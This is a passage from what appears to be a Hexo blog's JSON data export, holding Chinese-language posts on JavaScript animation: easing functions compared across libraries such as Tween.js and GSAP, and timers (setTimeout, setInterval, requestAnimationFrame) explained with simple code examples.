http://thednp.github.io/kute.js/","slug":"2018-JS动画之缓动函数分析及动画库","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8qu001fwovv7qx081og","content":"<p>上一篇讲了JS动画定时器相关知识，这一篇介绍下缓动函数及流行的动画库。</p>\n<h2 id=\"熟悉的图\"><a href=\"#熟悉的图\" class=\"headerlink\" title=\"熟悉的图\"></a>熟悉的图</h2><p><img src=\"/2018-JS动画之缓动函数分析及动画库/easingFunction.png\" alt=\"clipboard.png\"></p>\n<h2 id=\"实际使用\"><a href=\"#实际使用\" class=\"headerlink\" title=\"实际使用\"></a>实际使用</h2><p>jquery animate()+<a href=\"http://gsgd.co.uk/sandbox/jquery/easing/\" target=\"_blank\" rel=\"noopener\">jquery.easing插件</a>的使用：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$(selector).animate(styles,speed,easing,callback)</span><br></pre></td></tr></table></figure>\n<p>原生js使用：<br><a href=\"http://www.zhangxinxu.com/study/201612/how-to-use-tween-js.html\" target=\"_blank\" rel=\"noopener\">张鑫旭同学的文章</a></p>\n<h2 id=\"缓动函数知识\"><a href=\"#缓动函数知识\" class=\"headerlink\" title=\"缓动函数知识\"></a>缓动函数知识</h2><p>什么是缓动函数？我的理解是动画参数与数学公式结合的函数。</p>\n<p>各流行库缓动函数对比，以easeInQuad为例，如图：</p>\n<p><strong><a href=\"https://github.com/tweenjs/tween.js/blob/master/src/Tween.js\" target=\"_blank\" rel=\"noopener\">Tween.js</a></strong></p>\n<p><img src=\"/2018-JS动画之缓动函数分析及动画库/tweenjs.png\" alt=\"clipboard.png\"></p>\n<p><strong><a href=\"http://gsgd.co.uk/sandbox/jquery/easing/\" target=\"_blank\" rel=\"noopener\">jQuery.easing</a></strong></p>\n<p><img src=\"/2018-JS动画之缓动函数分析及动画库/jqueryEasing.png\" alt=\"clipboard.png\"></p>\n<p><strong><a href=\"https://greensock.com\" target=\"_blank\" rel=\"noopener\">GSAP</a></strong></p>\n<p><img src=\"/2018-JS动画之缓动函数分析及动画库/gsap.png\" alt=\"clipboard.png\"></p>\n<p><strong><a href=\"https://github.com/CreateJS/TweenJS/blob/master/src/tweenjs/Ease.js\" target=\"_blank\" rel=\"noopener\">CreateJS</a></strong></p>\n<p><img src=\"/2018-JS动画之缓动函数分析及动画库/creatJs.png\" alt=\"clipboard.png\"></p>\n<p><a href=\"http://thednp.github.io/kute.js/\" target=\"_blank\" rel=\"noopener\">Kute.js</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">easingFn.easingQuadraticIn = function (t) &#123; return t*t; &#125;;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"分析对比结果\"><a href=\"#分析对比结果\" class=\"headerlink\" title=\"分析对比结果\"></a>分析对比结果</h3><p>基本数学公式是一样的，都是2次方；<br>缓动函数是独立的，与平台载体无关；<br>缓动函数反应的是动画进程与数值变化量的对应关系，具体分析如下：</p>\n<p><a href=\"https://greensock.com/docs/Easing\" target=\"_blank\" rel=\"noopener\">GSAP Ease在线示例</a>，动画进程每增加一格，数值变化量是增加量是越来越大的，效果就是由慢到快。<br><img src=\"/2018-JS动画之缓动函数分析及动画库/greensockEase.png\" alt=\"clipboard.png\"></p>\n<p>与定时器无关，具体演变代码分析如下：<br>左侧演示的是，由于算法二次方，进程每次等量增加1/5，但是变化量却越来越大；右侧演示的是，虽然定时器改变了（间隔减小一倍，由“滴答”执行五次改成十次），但是变化量的趋势是一样的，相同的进程增量，对应的变化量也是相同。<br><img src=\"/2018-JS动画之缓动函数分析及动画库/yansuan.png\" alt=\"clipboard.png\"></p>\n<h2 id=\"动画库\"><a href=\"#动画库\" class=\"headerlink\" title=\"动画库\"></a>动画库</h2><p>动画库做的事基本就是一下四点：1，定时器；2，各种属性变量处理的封装；3，过程控制；4，缓动函数。</p>\n<p>实际运用中还是推荐大家用动画库，不满足业务需求的可以自己整合，当然学习的时候可以找个简单的读下源码，试着自己写下核心功能，深入理解动画库的本质，入门我推荐<strong>Kute.js</strong>。</p>\n<h2 id=\"动画库推荐（各自优劣势及区别下次再详述）\"><a href=\"#动画库推荐（各自优劣势及区别下次再详述）\" class=\"headerlink\" title=\"动画库推荐（各自优劣势及区别下次再详述）\"></a>动画库推荐（各自优劣势及区别下次再详述）</h2><p><a href=\"http://gsgd.co.uk/sandbox/jquery/easing/\" target=\"_blank\" rel=\"noopener\">jquery animate(插件jquery.easing.js)</a><br><a href=\"https://github.com/tweenjs/tween.js\" target=\"_blank\" rel=\"noopener\">Tween.js</a><br><a href=\"https://greensock.com\" target=\"_blank\" rel=\"noopener\">GSAP</a><br><a href=\"https://github.com/CreateJS\" target=\"_blank\" rel=\"noopener\">CreateJS</a><br><a href=\"http://thednp.github.io/kute.js/\" target=\"_blank\" rel=\"noopener\">Kute.js</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>上一篇讲了JS动画定时器相关知识，这一篇介绍下缓动函数及流行的动画库。</p>\n<h2 id=\"熟悉的图\"><a href=\"#熟悉的图\" class=\"headerlink\" title=\"熟悉的图\"></a>熟悉的图</h2><p><img src=\"/2018-JS动画之缓动函数分析及动画库/easingFunction.png\" alt=\"clipboard.png\"></p>\n<h2 id=\"实际使用\"><a href=\"#实际使用\" class=\"headerlink\" title=\"实际使用\"></a>实际使用</h2><p>jquery animate()+<a href=\"http://gsgd.co.uk/sandbox/jquery/easing/\" target=\"_blank\" rel=\"noopener\">jquery.easing插件</a>的使用：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$(selector).animate(styles,speed,easing,callback)</span><br></pre></td></tr></table></figure>\n<p>原生js使用：<br><a href=\"http://www.zhangxinxu.com/study/201612/how-to-use-tween-js.html\" target=\"_blank\" rel=\"noopener\">张鑫旭同学的文章</a></p>\n<h2 id=\"缓动函数知识\"><a href=\"#缓动函数知识\" class=\"headerlink\" title=\"缓动函数知识\"></a>缓动函数知识</h2><p>什么是缓动函数？我的理解是动画参数与数学公式结合的函数。</p>\n<p>各流行库缓动函数对比，以easeInQuad为例，如图：</p>\n<p><strong><a href=\"https://github.com/tweenjs/tween.js/blob/master/src/Tween.js\" target=\"_blank\" rel=\"noopener\">Tween.js</a></strong></p>\n<p><img src=\"/2018-JS动画之缓动函数分析及动画库/tweenjs.png\" alt=\"clipboard.png\"></p>\n<p><strong><a href=\"http://gsgd.co.uk/sandbox/jquery/easing/\" target=\"_blank\" rel=\"noopener\">jQuery.easing</a></strong></p>\n<p><img src=\"/2018-JS动画之缓动函数分析及动画库/jqueryEasing.png\" alt=\"clipboard.png\"></p>\n<p><strong><a href=\"https://greensock.com\" target=\"_blank\" rel=\"noopener\">GSAP</a></strong></p>\n<p><img src=\"/2018-JS动画之缓动函数分析及动画库/gsap.png\" alt=\"clipboard.png\"></p>\n<p><strong><a href=\"https://github.com/CreateJS/TweenJS/blob/master/src/tweenjs/Ease.js\" target=\"_blank\" rel=\"noopener\">CreateJS</a></strong></p>\n<p><img src=\"/2018-JS动画之缓动函数分析及动画库/creatJs.png\" alt=\"clipboard.png\"></p>\n<p><a href=\"http://thednp.github.io/kute.js/\" target=\"_blank\" rel=\"noopener\">Kute.js</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">easingFn.easingQuadraticIn = function (t) &#123; return t*t; &#125;;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"分析对比结果\"><a href=\"#分析对比结果\" class=\"headerlink\" title=\"分析对比结果\"></a>分析对比结果</h3><p>基本数学公式是一样的，都是2次方；<br>缓动函数是独立的，与平台载体无关；<br>缓动函数反应的是动画进程与数值变化量的对应关系，具体分析如下：</p>\n<p><a href=\"https://greensock.com/docs/Easing\" target=\"_blank\" rel=\"noopener\">GSAP Ease在线示例</a>，动画进程每增加一格，数值变化量是增加量是越来越大的，效果就是由慢到快。<br><img src=\"/2018-JS动画之缓动函数分析及动画库/greensockEase.png\" alt=\"clipboard.png\"></p>\n<p>与定时器无关，具体演变代码分析如下：<br>左侧演示的是，由于算法二次方，进程每次等量增加1/5，但是变化量却越来越大；右侧演示的是，虽然定时器改变了（间隔减小一倍，由“滴答”执行五次改成十次），但是变化量的趋势是一样的，相同的进程增量，对应的变化量也是相同。<br><img src=\"/2018-JS动画之缓动函数分析及动画库/yansuan.png\" alt=\"clipboard.png\"></p>\n<h2 id=\"动画库\"><a href=\"#动画库\" class=\"headerlink\" title=\"动画库\"></a>动画库</h2><p>动画库做的事基本就是一下四点：1，定时器；2，各种属性变量处理的封装；3，过程控制；4，缓动函数。</p>\n<p>实际运用中还是推荐大家用动画库，不满足业务需求的可以自己整合，当然学习的时候可以找个简单的读下源码，试着自己写下核心功能，深入理解动画库的本质，入门我推荐<strong>Kute.js</strong>。</p>\n<h2 id=\"动画库推荐（各自优劣势及区别下次再详述）\"><a href=\"#动画库推荐（各自优劣势及区别下次再详述）\" class=\"headerlink\" title=\"动画库推荐（各自优劣势及区别下次再详述）\"></a>动画库推荐（各自优劣势及区别下次再详述）</h2><p><a href=\"http://gsgd.co.uk/sandbox/jquery/easing/\" target=\"_blank\" rel=\"noopener\">jquery animate(插件jquery.easing.js)</a><br><a href=\"https://github.com/tweenjs/tween.js\" target=\"_blank\" rel=\"noopener\">Tween.js</a><br><a href=\"https://greensock.com\" target=\"_blank\" rel=\"noopener\">GSAP</a><br><a href=\"https://github.com/CreateJS\" target=\"_blank\" rel=\"noopener\">CreateJS</a><br><a href=\"http://thednp.github.io/kute.js/\" target=\"_blank\" rel=\"noopener\">Kute.js</a></p>\n"},{"title":"JS动画（一）——定时器详解","date":"2018-04-09T09:40:42.000Z","updated":"2018-08-07T00:36:16.000Z","_content":"广义说：一切通过js改变的视觉呈现都叫动画；例如，按钮，链接等元素交互反馈。\n狭义说：通过定时器连续调用js函数进行元素属性改变产生的视觉动画效果。\n## 定时器 ##\n定时器是JavaScript动画的核心技术；\nsetTimeout(),setInterval()是大家熟知的，以前经常使用的；\n一般都是做些辅助性，锦上添花的事；\n细心的人可能会发现一个现象，从其他标签页切换到有循环动画页面会有卡顿和急速帧切换现象；\n问题就在于他们的内在运行机制；\n\n### 认识setTimeout ###\n第一个参数推荐用函数形式，字符串形式会两次解析，还有eval一样的问题；\n不止两个参数，可以更多，见示例1；\nthis指向问题，见示例2；\n返回值是个整数；\nclearTimeout(timer)取消定时器；\nsetInterval,clearInterval同上；\n\n示例1：\n```\nsetTimeout(function(a,b){ \n\tconsole.log(a+b); \n},1000,1,1)；\n\n```\n示例2：\n```\nvar a = 0;\nfunction foo(){\n    console.log(this.a);\n};\nvar obj = {\n    a : 2,\n    foo:foo\n}\nsetTimeout(obj.foo,100);\n\n```\n### 运行机制 ###\n示例：\n\n```\nsetTimeout(function(){ \n\tconsole.log(1); \n}); \nconsole.log(0);\n```\n原因：加入队列，阻塞执行。\n\nsetTimeout图例：\n![](setTimeout.png)\n\nsetInterval图例：\n![](setInterval.png)\n### 存在即合理 ###\n父子元素事件冒泡，需要先执行父元素，见示例3；\n用户自定义的回调函数，通常在浏览器的默认动作之前触发，见示例4；\n\n示例3：\n```\n<div id=\"myDiv\" style=\"height: 100px;width: 100px;background-color: pink;\"></div>\n<script>\nmyDiv.onclick = function(){\n    setTimeout(function(){\n        alert(0);\n    })\n}\ndocument.onclick = function(){\n    alert(1);\n}\n</script>\n\n```\n示例4：\n\n```\n<input type=\"text\" id=\"myInput\">\n<script>\nmyInput.onkeypress = function(event) {\n    setTimeout(function(){\n        myInput.value = myInput.value.toUpperCase();\n    });\n}\n</script>\n\n```\n### 认识requestAnimationFrame ###\n用法与setTimeout类似，只是不需要时间参数；\n机制完全不同：\n1， setTimeout是异步操作，加入任务队列（ event loop ），当js引擎线程中同步代码执行完才会从任务队列中取出执行；\n2，raf是用户代理（浏览器）专门针对动画开发的接口，用户代理会以合适的频率进行动画帧更新（一般同显示器刷新频率，1000/60ms），在隐藏或者非活动页面会停止帧更新，节省CPU资源；\n3，[raf示例][1]\n### raf简单兼容 ###\n\n```\nwindow.requestAnimFrame = (function(){ \n    return  window.requestAnimationFrame || \n            window.webkitRequestAnimationFrame ||         \n            window.mozRequestAnimationFrame || \n            function( callback ){ \t\n                window.setTimeout(callback, 1000 / 60);\n         \t};\n     })();\n\n```\n参考：\n[setTimeout详细介绍][2]\n\n\n  [1]: https://codepen.io/lovechoose/pen/OzVPgg\n  [2]: http://www.cnblogs.com/xiaohuochai/p/5773183.html","source":"_posts/2018/JS动画之定时器详解.md","raw":"---\ntitle: JS动画（一）——定时器详解\ntags:\n  - 动效\n  - JavaScript\ncategories:\n  - 前端\ndate: 2018-04-09 17:40:42\nupdated: 2018-08-07 08:36:16\n---\n广义说：一切通过js改变的视觉呈现都叫动画；例如，按钮，链接等元素交互反馈。\n狭义说：通过定时器连续调用js函数进行元素属性改变产生的视觉动画效果。\n## 定时器 ##\n定时器是JavaScript动画的核心技术；\nsetTimeout(),setInterval()是大家熟知的，以前经常使用的；\n一般都是做些辅助性，锦上添花的事；\n细心的人可能会发现一个现象，从其他标签页切换到有循环动画页面会有卡顿和急速帧切换现象；\n问题就在于他们的内在运行机制；\n\n### 认识setTimeout ###\n第一个参数推荐用函数形式，字符串形式会两次解析，还有eval一样的问题；\n不止两个参数，可以更多，见示例1；\nthis指向问题，见示例2；\n返回值是个整数；\nclearTimeout(timer)取消定时器；\nsetInterval,clearInterval同上；\n\n示例1：\n```\nsetTimeout(function(a,b){ \n\tconsole.log(a+b); \n},1000,1,1)；\n\n```\n示例2：\n```\nvar a = 0;\nfunction foo(){\n    console.log(this.a);\n};\nvar obj = {\n    a : 2,\n    foo:foo\n}\nsetTimeout(obj.foo,100);\n\n```\n### 运行机制 ###\n示例：\n\n```\nsetTimeout(function(){ \n\tconsole.log(1); \n}); \nconsole.log(0);\n```\n原因：加入队列，阻塞执行。\n\nsetTimeout图例：\n![](setTimeout.png)\n\nsetInterval图例：\n![](setInterval.png)\n### 存在即合理 ###\n父子元素事件冒泡，需要先执行父元素，见示例3；\n用户自定义的回调函数，通常在浏览器的默认动作之前触发，见示例4；\n\n示例3：\n```\n<div id=\"myDiv\" style=\"height: 100px;width: 100px;background-color: pink;\"></div>\n<script>\nmyDiv.onclick = function(){\n    setTimeout(function(){\n        alert(0);\n    })\n}\ndocument.onclick = function(){\n    alert(1);\n}\n</script>\n\n```\n示例4：\n\n```\n<input type=\"text\" id=\"myInput\">\n<script>\nmyInput.onkeypress = function(event) {\n    setTimeout(function(){\n        myInput.value = myInput.value.toUpperCase();\n    });\n}\n</script>\n\n```\n### 认识requestAnimationFrame ###\n用法与setTimeout类似，只是不需要时间参数；\n机制完全不同：\n1， setTimeout是异步操作，加入任务队列（ event loop ），当js引擎线程中同步代码执行完才会从任务队列中取出执行；\n2，raf是用户代理（浏览器）专门针对动画开发的接口，用户代理会以合适的频率进行动画帧更新（一般同显示器刷新频率，1000/60ms），在隐藏或者非活动页面会停止帧更新，节省CPU资源；\n3，[raf示例][1]\n### raf简单兼容 ###\n\n```\nwindow.requestAnimFrame = (function(){ \n    return  window.requestAnimationFrame || \n            window.webkitRequestAnimationFrame ||         \n            window.mozRequestAnimationFrame || \n            function( callback ){ \t\n                window.setTimeout(callback, 1000 / 60);\n         \t};\n     })();\n\n```\n参考：\n[setTimeout详细介绍][2]\n\n\n  [1]: https://codepen.io/lovechoose/pen/OzVPgg\n  [2]: http://www.cnblogs.com/xiaohuochai/p/5773183.html","slug":"2018-JS动画之定时器详解","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8qz001iwovv5i49tj76","content":"<p>广义说：一切通过js改变的视觉呈现都叫动画；例如，按钮，链接等元素交互反馈。<br>狭义说：通过定时器连续调用js函数进行元素属性改变产生的视觉动画效果。</p>\n<h2 id=\"定时器\"><a href=\"#定时器\" class=\"headerlink\" title=\"定时器\"></a>定时器</h2><p>定时器是JavaScript动画的核心技术；<br>setTimeout(),setInterval()是大家熟知的，以前经常使用的；<br>一般都是做些辅助性，锦上添花的事；<br>细心的人可能会发现一个现象，从其他标签页切换到有循环动画页面会有卡顿和急速帧切换现象；<br>问题就在于他们的内在运行机制；</p>\n<h3 id=\"认识setTimeout\"><a href=\"#认识setTimeout\" class=\"headerlink\" title=\"认识setTimeout\"></a>认识setTimeout</h3><p>第一个参数推荐用函数形式，字符串形式会两次解析，还有eval一样的问题；<br>不止两个参数，可以更多，见示例1；<br>this指向问题，见示例2；<br>返回值是个整数；<br>clearTimeout(timer)取消定时器；<br>setInterval,clearInterval同上；</p>\n<p>示例1：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(function(a,b)&#123; </span><br><span class=\"line\">\tconsole.log(a+b); </span><br><span class=\"line\">&#125;,1000,1,1)；</span><br></pre></td></tr></table></figure></p>\n<p>示例2：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = 0;</span><br><span class=\"line\">function foo()&#123;</span><br><span class=\"line\">    console.log(this.a);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">    a : 2,</span><br><span class=\"line\">    foo:foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">setTimeout(obj.foo,100);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"运行机制\"><a href=\"#运行机制\" class=\"headerlink\" title=\"运行机制\"></a>运行机制</h3><p>示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(function()&#123; </span><br><span class=\"line\">\tconsole.log(1); </span><br><span class=\"line\">&#125;); </span><br><span class=\"line\">console.log(0);</span><br></pre></td></tr></table></figure>\n<p>原因：加入队列，阻塞执行。</p>\n<p>setTimeout图例：<br><img src=\"/2018-JS动画之定时器详解/setTimeout.png\" alt=\"\"></p>\n<p>setInterval图例：<br><img src=\"/2018-JS动画之定时器详解/setInterval.png\" alt=\"\"></p>\n<h3 id=\"存在即合理\"><a href=\"#存在即合理\" class=\"headerlink\" title=\"存在即合理\"></a>存在即合理</h3><p>父子元素事件冒泡，需要先执行父元素，见示例3；<br>用户自定义的回调函数，通常在浏览器的默认动作之前触发，见示例4；</p>\n<p>示例3：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;myDiv&quot; style=&quot;height: 100px;width: 100px;background-color: pink;&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">myDiv.onclick = function()&#123;</span><br><span class=\"line\">    setTimeout(function()&#123;</span><br><span class=\"line\">        alert(0);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">document.onclick = function()&#123;</span><br><span class=\"line\">    alert(1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<p>示例4：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;text&quot; id=&quot;myInput&quot;&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">myInput.onkeypress = function(event) &#123;</span><br><span class=\"line\">    setTimeout(function()&#123;</span><br><span class=\"line\">        myInput.value = myInput.value.toUpperCase();</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"认识requestAnimationFrame\"><a href=\"#认识requestAnimationFrame\" class=\"headerlink\" title=\"认识requestAnimationFrame\"></a>认识requestAnimationFrame</h3><p>用法与setTimeout类似，只是不需要时间参数；<br>机制完全不同：<br>1， setTimeout是异步操作，加入任务队列（ event loop ），当js引擎线程中同步代码执行完才会从任务队列中取出执行；<br>2，raf是用户代理（浏览器）专门针对动画开发的接口，用户代理会以合适的频率进行动画帧更新（一般同显示器刷新频率，1000/60ms），在隐藏或者非活动页面会停止帧更新，节省CPU资源；<br>3，<a href=\"https://codepen.io/lovechoose/pen/OzVPgg\" target=\"_blank\" rel=\"noopener\">raf示例</a></p>\n<h3 id=\"raf简单兼容\"><a href=\"#raf简单兼容\" class=\"headerlink\" title=\"raf简单兼容\"></a>raf简单兼容</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.requestAnimFrame = (function()&#123; </span><br><span class=\"line\">    return  window.requestAnimationFrame || </span><br><span class=\"line\">            window.webkitRequestAnimationFrame ||         </span><br><span class=\"line\">            window.mozRequestAnimationFrame || </span><br><span class=\"line\">            function( callback )&#123; \t</span><br><span class=\"line\">                window.setTimeout(callback, 1000 / 60);</span><br><span class=\"line\">         \t&#125;;</span><br><span class=\"line\">     &#125;)();</span><br></pre></td></tr></table></figure>\n<p>参考：<br><a href=\"http://www.cnblogs.com/xiaohuochai/p/5773183.html\" target=\"_blank\" rel=\"noopener\">setTimeout详细介绍</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>广义说：一切通过js改变的视觉呈现都叫动画；例如，按钮，链接等元素交互反馈。<br>狭义说：通过定时器连续调用js函数进行元素属性改变产生的视觉动画效果。</p>\n<h2 id=\"定时器\"><a href=\"#定时器\" class=\"headerlink\" title=\"定时器\"></a>定时器</h2><p>定时器是JavaScript动画的核心技术；<br>setTimeout(),setInterval()是大家熟知的，以前经常使用的；<br>一般都是做些辅助性，锦上添花的事；<br>细心的人可能会发现一个现象，从其他标签页切换到有循环动画页面会有卡顿和急速帧切换现象；<br>问题就在于他们的内在运行机制；</p>\n<h3 id=\"认识setTimeout\"><a href=\"#认识setTimeout\" class=\"headerlink\" title=\"认识setTimeout\"></a>认识setTimeout</h3><p>第一个参数推荐用函数形式，字符串形式会两次解析，还有eval一样的问题；<br>不止两个参数，可以更多，见示例1；<br>this指向问题，见示例2；<br>返回值是个整数；<br>clearTimeout(timer)取消定时器；<br>setInterval,clearInterval同上；</p>\n<p>示例1：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(function(a,b)&#123; </span><br><span class=\"line\">\tconsole.log(a+b); </span><br><span class=\"line\">&#125;,1000,1,1)；</span><br></pre></td></tr></table></figure></p>\n<p>示例2：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = 0;</span><br><span class=\"line\">function foo()&#123;</span><br><span class=\"line\">    console.log(this.a);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">    a : 2,</span><br><span class=\"line\">    foo:foo</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">setTimeout(obj.foo,100);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"运行机制\"><a href=\"#运行机制\" class=\"headerlink\" title=\"运行机制\"></a>运行机制</h3><p>示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setTimeout(function()&#123; </span><br><span class=\"line\">\tconsole.log(1); </span><br><span class=\"line\">&#125;); </span><br><span class=\"line\">console.log(0);</span><br></pre></td></tr></table></figure>\n<p>原因：加入队列，阻塞执行。</p>\n<p>setTimeout图例：<br><img src=\"/2018-JS动画之定时器详解/setTimeout.png\" alt=\"\"></p>\n<p>setInterval图例：<br><img src=\"/2018-JS动画之定时器详解/setInterval.png\" alt=\"\"></p>\n<h3 id=\"存在即合理\"><a href=\"#存在即合理\" class=\"headerlink\" title=\"存在即合理\"></a>存在即合理</h3><p>父子元素事件冒泡，需要先执行父元素，见示例3；<br>用户自定义的回调函数，通常在浏览器的默认动作之前触发，见示例4；</p>\n<p>示例3：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;myDiv&quot; style=&quot;height: 100px;width: 100px;background-color: pink;&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">myDiv.onclick = function()&#123;</span><br><span class=\"line\">    setTimeout(function()&#123;</span><br><span class=\"line\">        alert(0);</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">document.onclick = function()&#123;</span><br><span class=\"line\">    alert(1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<p>示例4：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input type=&quot;text&quot; id=&quot;myInput&quot;&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">myInput.onkeypress = function(event) &#123;</span><br><span class=\"line\">    setTimeout(function()&#123;</span><br><span class=\"line\">        myInput.value = myInput.value.toUpperCase();</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"认识requestAnimationFrame\"><a href=\"#认识requestAnimationFrame\" class=\"headerlink\" title=\"认识requestAnimationFrame\"></a>认识requestAnimationFrame</h3><p>用法与setTimeout类似，只是不需要时间参数；<br>机制完全不同：<br>1， setTimeout是异步操作，加入任务队列（ event loop ），当js引擎线程中同步代码执行完才会从任务队列中取出执行；<br>2，raf是用户代理（浏览器）专门针对动画开发的接口，用户代理会以合适的频率进行动画帧更新（一般同显示器刷新频率，1000/60ms），在隐藏或者非活动页面会停止帧更新，节省CPU资源；<br>3，<a href=\"https://codepen.io/lovechoose/pen/OzVPgg\" target=\"_blank\" rel=\"noopener\">raf示例</a></p>\n<h3 id=\"raf简单兼容\"><a href=\"#raf简单兼容\" class=\"headerlink\" title=\"raf简单兼容\"></a>raf简单兼容</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.requestAnimFrame = (function()&#123; </span><br><span class=\"line\">    return  window.requestAnimationFrame || </span><br><span class=\"line\">            window.webkitRequestAnimationFrame ||         </span><br><span class=\"line\">            window.mozRequestAnimationFrame || </span><br><span class=\"line\">            function( callback )&#123; \t</span><br><span class=\"line\">                window.setTimeout(callback, 1000 / 60);</span><br><span class=\"line\">         \t&#125;;</span><br><span class=\"line\">     &#125;)();</span><br></pre></td></tr></table></figure>\n<p>参考：<br><a href=\"http://www.cnblogs.com/xiaohuochai/p/5773183.html\" target=\"_blank\" rel=\"noopener\">setTimeout详细介绍</a></p>\n"},{"title":"在HTML中使用JavaScript（《JavaScript高级程序设计》）","date":"2018-12-19T03:51:41.000Z","updated":"2018-12-19T03:51:41.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 